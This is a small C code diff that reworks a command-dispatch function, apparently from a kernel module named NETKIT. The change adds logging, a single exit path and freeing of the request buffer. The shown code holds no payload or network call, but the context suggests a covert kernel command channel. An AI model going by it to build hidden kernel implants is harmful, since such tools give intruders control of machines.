@@ -11,19 +11,32 @@ static int (*COMM_HANDLERS[])(const u8*, size_t, u8**, size_t*) = {
 };
 
 
-static inline int cmd_process(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
+static inline int cmd_process(u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
 {
     u8 cmd_id;
+    int retv;
 
     if (req_buflen < 1)
-        return -EINVAL;
+    {
+        retv = -EINVAL;
+        goto LAB_OUT;
+    }
 
     cmd_id = req_buf[0];
     if (cmd_id < 0 || cmd_id >= sizeof(COMM_HANDLERS) / sizeof(*COMM_HANDLERS))
-        return -EDOM;
+    {
+        NETKIT_LOG("[!] inval cmd: %hhd\n", cmd_id);
+        retv = -EDOM;
+        goto LAB_OUT;
+    }
 
     NETKIT_LOG("[*] processing cmd: %hhd\n", cmd_id);
 
     // allow OOB ptr with size 0
-    return COMM_HANDLERS[cmd_id](req_buf + 1, req_buflen - 1, res_buf, res_buflen);
+    retv = COMM_HANDLERS[cmd_id](req_buf + 1, req_buflen - 1, res_buf, res_buflen);
+
+LAB_OUT:
+    kzfree(req_buf, req_buflen);
+
+    return retv;
 }
